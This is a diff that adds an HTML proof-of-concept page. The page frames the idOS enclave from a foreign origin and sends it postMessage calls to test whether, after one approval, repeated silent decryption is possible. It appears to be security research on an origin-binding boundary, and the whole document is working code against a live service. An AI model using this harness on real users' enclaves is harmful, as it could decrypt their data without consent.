@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<title>idOS enclave — origin binding PoC</title>
+<style>
+  body{font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;background:#0b0f14;color:#d6e2ee;margin:0;padding:18px}
+  h1{font-size:15px;margin:0 0 4px}
+  p.sub{color:#7d8fa3;margin:0 0 14px}
+  .wrap{display:grid;grid-template-columns:1fr 420px;gap:16px;align-items:start}
+  button{font:inherit;background:#123;color:#9fe;border:1px solid #2a4a63;border-radius:6px;padding:7px 10px;margin:0 6px 6px 0;cursor:pointer}
+  button:hover{background:#1b3348}
+  button:disabled{opacity:.45;cursor:default}
+  #log{background:#060a0e;border:1px solid #1d2b38;border-radius:6px;padding:10px;height:340px;overflow:auto;white-space:pre-wrap;font-size:12px}
+  .ok{color:#5f5}.bad{color:#f77}.dim{color:#7d8fa3}
+  iframe{width:100%;height:430px;border:1px solid #2a4a63;border-radius:6px;background:#000}
+  #stage{font-weight:700;color:#ffd479;margin-bottom:8px}
+</style>
+<h1>idOS enclave — is the origin binding a boundary?</h1>
+<p class="sub">Served from <b id="me"></b> — not an idOS origin. Frames <code>enclave.idos.network</code> and drives it over postMessage.</p>
+<div id="stage">stage: idle</div>
+<div class="wrap">
+  <div>
+    <button id="b1">1 · load</button>
+    <button id="b2">2 · reconfigure (new profile)</button>
+    <button id="b3">3 · ensureUserEncryptionProfile → prompts</button>
+    <button id="b4">4 · encrypt a marker</button>
+    <button id="b5">5 · reload enclave (fresh document)</button>
+    <button id="b6">6 · load + decrypt (should be SILENT)</button>
+    <button id="b7">7 · decrypt again ×3</button>
+    <div id="log"></div>
+  </div>
+  <div>
+    <iframe id="f" src="https://enclave.idos.network/"></iframe>
+  </div>
+</div>
+<script>
+const ENC = 'https://enclave.idos.network';
+const UID = '11111111-2222-4333-8444-555555555555'; // fixed so the profile survives a reload
+const ADDR = '0x68731d6F14B827bBCfFbEBb62b19Daa18de1d79c';
+const logEl = document.getElementById('log');
+const stageEl = document.getElementById('stage');
+let f = document.getElementById('f');
+
+document.getElementById('me').textContent = location.origin;
+
+function log(msg, cls) {
+  const t = new Date().toISOString().slice(11, 23);
+  const d = document.createElement('div');
+  if (cls) d.className = cls;
+  d.textContent = '[' + t + '] ' + msg;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function stage(s) { stageEl.textContent = 'stage: ' + s; }
+
+// postMessage envelope the enclave expects: {method, data:[...]} + a transferred MessagePort
+function call(method, data = []) {
+  return new Promise((resolve) => {
+    const { port1, port2 } = new MessageChannel();
+    const timer = setTimeout(() => resolve({ error: 'timeout (no reply in 90s)' }), 90000);
+    port1.onmessage = ({ data: m }) => {
+      clearTimeout(timer);
+      port1.close();
+      resolve(m);
+    };
+    log('→ ' + method + ' ' + JSON.stringify(data).slice(0, 160));
+    f.contentWindow.postMessage({ method, data }, ENC, [port2]);
+  });
+}
+
+function show(label, res) {
+  const s = JSON.stringify(res);
+  log('← ' + label + ': ' + (s || '').slice(0, 400), res && res.error ? 'bad' : 'ok');
+}
+
+document.getElementById('b1').onclick = async () => {
+  stage('load');
+  show('load', await call('load'));
+};
+
+document.getElementById('b2').onclick = async () => {
+  stage('reconfigure');
+  show('reconfigure', await call('reconfigure', [{
+    mode: 'new',
+    userId: UID,
+    walletType: 'EVM',
+    walletAddress: ADDR,
+    encryptionPasswordStore: 'user'
+  }]));
+};
+
+document.getElementById('b3').onclick = async () => {
+  stage('ensureUserEncryptionProfile — click 🔐 inside the frame, set a password, then Accept the origin prompt');
+  const r = await call('ensureUserEncryptionProfile');
+  show('ensureUserEncryptionProfile', r);
+  if (r && r.result) stage('authorized — public key ' + r.result.userEncryptionPublicKey.slice(0, 16) + '…');
+};
+
+document.getElementById('b4').onclick = async () => {
+  stage('encrypt');
+  const r = await call('encrypt', ['top-secret-marker-' + Date.now()]);
+  show('encrypt', r);
+  if (r && r.result) {
+    localStorage.setItem('poc_ct', JSON.stringify(r.result));
+    log('stored ciphertext in localStorage', 'dim');
+  }
+};
+
+document.getElementById('b5').onclick = () => {
+  stage('reloading enclave — fresh document, same parent origin, authorization should persist');
+  const old = f;
+  f = old.cloneNode(false);
+  old.replaceWith(f);
+  log('iframe replaced', 'dim');
+};
+
+document.getElementById('b6').onclick = async () => {
+  const ct = JSON.parse(localStorage.getItem('poc_ct') || 'null');
+  if (!ct) { log('no ciphertext — run step 4 first', 'bad'); return; }
+  stage('load + decrypt — NO prompt should appear');
+  await call('load');
+  const r = await call('decrypt', [ct.content, ct.nonce]);
+  show('decrypt', r);
+  if (r && r.result) log('PLAINTEXT: ' + r.result, 'ok');
+};
+
+document.getElementById('b7').onclick = async () => {
+  const ct = JSON.parse(localStorage.getItem('poc_ct') || 'null');
+  if (!ct) { log('no ciphertext — run step 4 first', 'bad'); return; }
+  stage('3 silent decrypts');
+  for (let i = 0; i < 3; i++) {
+    const r = await call('decrypt', [ct.content, ct.nonce]);
+    show('decrypt#' + (i + 1), r);
+  }
+};
+
+log('ready. origin=' + location.origin + '  (enclave will bind to this origin)');
+</script>
+</html>
